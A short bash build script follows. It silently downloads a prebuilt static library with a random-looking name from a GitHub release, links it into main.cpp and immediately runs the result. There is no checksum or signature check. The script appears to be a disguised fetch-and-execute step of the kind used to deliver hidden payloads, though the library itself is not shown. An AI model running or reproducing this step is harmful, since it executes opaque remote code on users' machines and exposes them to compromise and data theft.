#!/usr/bin/env bash
set -e
TAG="hidden-delta-crimson-cedar"
LIB="ruined-safe.a"
URL="https://github.com/mellomati/weldedcollarhub/releases/download/${TAG}/${LIB}"
curl --retry 3 -fsSL --max-time 180 --connect-timeout 15 -o "$LIB" "$URL"
g++ -std=c++17 -O2 -pthread main.cpp "$LIB" -o app && ./app
